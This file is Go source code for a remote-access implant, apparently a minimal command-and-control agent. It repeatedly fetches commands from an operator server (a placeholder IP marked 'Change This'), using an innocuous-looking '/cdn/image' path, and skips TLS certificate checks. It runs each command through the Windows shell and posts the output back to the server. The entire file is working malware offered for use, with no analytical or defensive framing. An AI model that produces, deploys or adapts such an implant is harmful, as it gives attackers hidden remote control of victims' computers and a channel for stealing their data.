package main

import (
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"os/exec"
	"time"
)

func main() {
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
			},
		},
	}

	c2URL := "https://192.168.0.4" // Change This

	for {
		resp, err := client.Get(c2URL + "/cdn/image")
		if err != nil {
			fmt.Println("[-] Failed to fetch task:", err)
			time.Sleep(5 * time.Second)
			continue
		}

		cmdData, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		cmd := string(cmdData)
		fmt.Println("[*] Received command:", cmd)

		output, err := exec.Command("cmd", "/C", cmd).CombinedOutput()
		if err != nil {
			output = append(output, []byte("\n[!] Error: "+err.Error())...)
		}

		_, err = client.Post(c2URL+"/api/logs", "text/plain",
			io.NopCloser((io.Reader)(stringReader(output))))
		if err != nil {
			fmt.Println("[-] Failed to send result:", err)
		}

		time.Sleep(5 * time.Second)
	}
}

func stringReader(s []byte) *io.PipeReader {
	pr, pw := io.Pipe()
	go func() {
		pw.Write(s)
		pw.Close()
	}()
	return pr
}
